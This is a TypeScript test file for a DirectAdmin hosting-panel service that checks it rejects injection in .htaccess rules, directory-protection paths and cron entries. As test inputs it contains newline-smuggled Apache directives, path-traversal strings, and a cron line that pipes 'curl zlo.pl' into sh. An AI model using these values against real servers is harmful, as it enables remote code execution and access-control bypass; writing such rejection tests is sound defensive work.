import { BadRequestException } from '@nestjs/common';
import { plainToInstance } from 'class-transformer';
import { validateSync } from 'class-validator';
import { DirectAdminService } from './directadmin.service.js';
import { ZadanieCronDto } from '../subscriptions/dto/hosting-cron.dto.js';

/**
 * X-09 — DirectAdminService (ponad 3 tys. linii, dotąd testowany jeden helper).
 * Ten plik bierze to, co stoi na granicy zaufania: parsowanie odpowiedzi DA,
 * zapis .htaccess z danych klienta, ochronę katalogu hasłem i crona.
 */
const svc = new DirectAdminService({} as never, {} as never, {} as never, {} as never);
const priv = svc as unknown as Record<string, (...a: unknown[]) => unknown>;
const BEGIN = '# BEGIN VERRIS WEBTOOLS (zarządzane przez panel — nie edytuj ręcznie)';
const END = '# END VERRIS WEBTOOLS';

describe('X-09 — odpowiedzi DirectAdmina', () => {
  it('parseKvPayload: błąd DA zamienia się w 400 z tekstem DA; tablice na list0..N', () => {
    expect(() => priv.parseKvPayload({ error: '1', text: 'Użytkownik istnieje' })).toThrow('Użytkownik istnieje');
    const p = priv.parseKvPayload({ error: '0', list: ['a', ' ', 'b'], nested: { x: 1 } }) as URLSearchParams;
    expect(p.get('list0')).toBe('a');
    expect(p.get('list2')).toBe('b');
    expect(p.has('nested')).toBe(false);
    expect((priv.parseKvPayload('a=1&b=2') as URLSearchParams).get('b')).toBe('2');
  });

  it('parseDaListEntries: bez duplikatów, z awaryjnym odczytem name/database', () => {
    expect(priv.parseDaListEntries(new URLSearchParams('list0=x&list1=y&list2=x'))).toEqual(['x', 'y']);
    expect(priv.parseDaListEntries(new URLSearchParams('error=0&name0=db1&database1=db2&text=ok'))).toEqual(['db1', 'db2']);
  });

  it('parseDaBackupFileRows: tylko archiwa, bez pól technicznych', () => {
    const rows = priv.parseDaBackupFileRows(new URLSearchParams('domain=x.pl&file0=user.a.tar.gz&file1=notatka.txt&list0=b.tar.zst&text=ok'));
    expect(rows).toEqual([{ id: 'file0', fileName: 'user.a.tar.gz' }, { id: 'list0', fileName: 'b.tar.zst' }]);
  });

  it('interpretDaPostResponse: error=1 w tekście i w JSON → 400; error=0 przechodzi', () => {
    expect(() => priv.interpretDaPostResponse('error=1&text=Brak%20miejsca')).toThrow('Brak miejsca');
    expect(() => priv.interpretDaPostResponse({ error: true, details: 'x' })).toThrow(BadRequestException);
    expect(() => priv.interpretDaPostResponse('error=0&text=OK')).not.toThrow();
    expect(() => priv.interpretDaPostResponse(null)).not.toThrow();
  });
});

describe('X-09 — blok .htaccess zarządzany przez panel', () => {
  it('wstawia blok przed regułami klienta i nie rusza ich przy ponownym zapisie', () => {
    const klienta = 'RewriteEngine On\nRewriteRule ^stara$ /nowa [R=301]';
    const raz = priv.spliceManagedBlock(klienta, 'Require all granted') as string;
    const dwa = priv.spliceManagedBlock(raz, 'Require all granted') as string;
    expect(raz.startsWith(BEGIN)).toBe(true);
    expect(raz).toContain(klienta);
    expect(dwa).toBe(raz);
    expect(dwa.split(BEGIN).length).toBe(2);
  });

  it('usunięcie bloku zostawia wyłącznie reguły klienta', () => {
    const z = priv.spliceManagedBlock(`${BEGIN}\nRequire not ip 1.2.3.4\n${END}\n\nOptions -Indexes\n`, null);
    expect(z).toBe('Options -Indexes\n');
  });

  it('render: przekierowania kanoniczne przed blokadami, IP w RequireAll', () => {
    const out = priv.renderWebToolsHtaccess(
      { forceHttps: true, wwwMode: 'nonwww', redirects: [{ from: 'stara', to: '/nowa', type: '302' }], hotlink: { enabled: false }, blockedIps: ['1.2.3.4'], protectedDirs: [] },
      'firma.pl',
    ) as string;
    const linie = out.split('\n');
    expect(linie[0]).toBe('RewriteEngine On');
    expect(out).toContain('Redirect 302 /stara /nowa');
    expect(linie.indexOf('<RequireAll>')).toBeGreaterThan(linie.indexOf('RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]'));
    expect(out).toContain('Require not ip 1.2.3.4');
  });
});

describe('X-09 — zapis narzędzi WWW z danych klienta', () => {
  function zapis(input: Record<string, unknown>, o: { listDir?: () => Promise<unknown> } = {}) {
    const writeFile = vi.fn(async () => undefined);
    const self = Object.assign(Object.create(DirectAdminService.prototype), {
      prisma: { subscription: { findFirst: async () => ({ id: 's1', account: { id: 'a1' } }) } },
      syncPrimaryDomainForSubscription: async () => 'firma.pl',
      getHostingWebTools: async () => ({ state: { protectedDirs: [] }, fetchError: null }),
      getClientForHostingAccount: async () => ({
        writeFile,
        listDir: o.listDir ?? (async () => [{ name: '.htaccess', type: 'file' }]),
        downloadFile: async () => Buffer.from('Options -Indexes'),
      }),
      audit: { record: vi.fn(async () => undefined) },
    });
    return { run: () => (self as DirectAdminService).saveHostingWebTools('s1', 'u1', input as never), writeFile };
  }

  it.each([
    [{ hotlink: { enabled: true, allow: ['sklep.pl\nphp_value auto_prepend_file /tmp/x'] } }, 'dozwolonych'],
    [{ redirects: [{ from: '/a', to: '/b [L]\nphp_flag engine on' }] }, 'cel'],
    [{ redirects: [{ from: '/a b', to: '/b' }] }, 'źródłowa'],
    [{ blockedIps: ['1.2.3.4\nRequire all granted'] }, 'IP'],
  ])('odrzuca wstrzyknięcie dyrektywy: %j', async (input, fragment) => {
    const z = zapis(input);
    await expect(z.run()).rejects.toThrow(fragment);
    expect(z.writeFile).not.toHaveBeenCalled();
  });

  it('poprawne dane: .htaccess z blokiem panelu + zachowane reguły klienta', async () => {
    const z = zapis({ forceHttps: true, hotlink: { enabled: true, allow: ['https://partner.pl/sklep'] }, blockedIps: ['10.0.0.0/8'] });
    await z.run();
    const [, nazwa, tresc] = z.writeFile.mock.calls[0] as unknown as [string, string, string];
    expect(nazwa).toBe('.htaccess');
    expect(tresc).toContain('partner\\.pl');
    expect(tresc).toContain('Options -Indexes');
    expect(tresc).not.toMatch(/partner\.pl\/sklep/);
  });

  it('nieudany odczyt obecnego .htaccess → nic nie zapisujemy (reguły klienta nie znikają)', async () => {
    const z = zapis({ forceHttps: true }, { listDir: async () => Promise.reject(new Error('timeout of 15000ms exceeded')) });
    await expect(z.run()).rejects.toThrow('timeout');
    expect(z.writeFile).not.toHaveBeenCalled();
  });
});

describe('X-09 — ochrona katalogu hasłem', () => {
  function chron(dir: string, realm?: string) {
    const writeFile = vi.fn(async () => undefined);
    const self = Object.assign(Object.create(DirectAdminService.prototype), {
      prisma: { subscription: { findFirst: async () => ({ id: 's1', account: { id: 'a1', daUsername: 'klient1' } }) } },
      syncPrimaryDomainForSubscription: async () => 'firma.pl',
      getHostingWebTools: async () => ({ state: { protectedDirs: [] } }),
      getClientForHostingAccount: async () => ({ writeFile, listDir: async () => [], downloadFile: async () => Buffer.from('') }),
      audit: { record: vi.fn(async () => undefined) },
    });
    const run = () => (self as DirectAdminService).setHostingDirectoryProtection('s1', 'u1', { dir, realm, user: 'admin', password: 'tajne123' });
    return { run, writeFile };
  }

  it.each(['../../', 'a/../../b', 'x;rm', 'a\nb'])('odrzuca ścieżkę %j', async (dir) => {
    const c = chron(dir);
    await expect(c.run()).rejects.toThrow('Nieprawidłowa ścieżka');
    expect(c.writeFile).not.toHaveBeenCalled();
  });

  it('realm bez cudzysłowów i nowych linii, ścieżka AuthUserFile w cudzysłowie (katalog ze spacją)', async () => {
    const c = chron('moje pliki', 'Strefa"\nRequire all granted');
    await c.run();
    const htaccess = (c.writeFile.mock.calls as unknown as Array<[string, string, string]>).find(([, n]) => n === '.htaccess')![2];
    expect(htaccess).toContain('AuthName "StrefaRequire all granted"');
    expect(htaccess).toContain('AuthUserFile "/home/klient1/domains/firma.pl/public_html/moje pliki/.htpasswd"');
    expect(htaccess.split('\n').filter((l) => l.trim() === 'Require all granted')).toHaveLength(0);
    const htpasswd = (c.writeFile.mock.calls as unknown as Array<[string, string, string]>).find(([, n]) => n === '.htpasswd')![2];
    expect(htpasswd).toMatch(/^admin:\$2y\$10\$/);
  });
});

describe('X-09 / L-03 — cron', () => {
  const dto = (o: Record<string, string>) =>
    validateSync(plainToInstance(ZadanieCronDto, { minute: '0', hour: '3', dayOfMonth: '*', month: '*', dayOfWeek: '*', command: 'php cron.php', ...o }));

  it('DTO: poprawny wpis przechodzi; nowa linia w komendzie lub polu i litery w harmonogramie — nie', () => {
    expect(dto({})).toHaveLength(0);
    expect(dto({ minute: '*/5', dayOfWeek: '1-5' })).toHaveLength(0);
    expect(dto({ command: 'php a.php\n* * * * * curl zlo.pl | sh' }).length).toBeGreaterThan(0);
    expect(dto({ hour: '3\n* * * * * id' }).length).toBeGreaterThan(0);
    expect(dto({ minute: '@reboot' }).length).toBeGreaterThan(0);
  });

  it('edycja: najpierw nowy wpis, potem usunięcie starego; zły identyfikator — nic nie wysyłamy', async () => {
    const kolejnosc: string[] = [];
    const self = Object.assign(Object.create(DirectAdminService.prototype), {
      createHostingCronJob: vi.fn(async () => { kolejnosc.push('create'); }),
      deleteHostingCronJob: vi.fn(async () => { kolejnosc.push('delete'); }),
    }) as DirectAdminService;
    const input = { minute: '0', hour: '4', dayOfMonth: '*', month: '*', dayOfWeek: '*', command: 'php b.php' };
    await self.updateHostingCronJob('s1', 'u1', '7', input);
    expect(kolejnosc).toEqual(['create', 'delete']);
    await expect(self.updateHostingCronJob('s1', 'u1', '7&select1=8', input)).rejects.toBeInstanceOf(BadRequestException);
    expect(kolejnosc).toEqual(['create', 'delete']);
  });
});
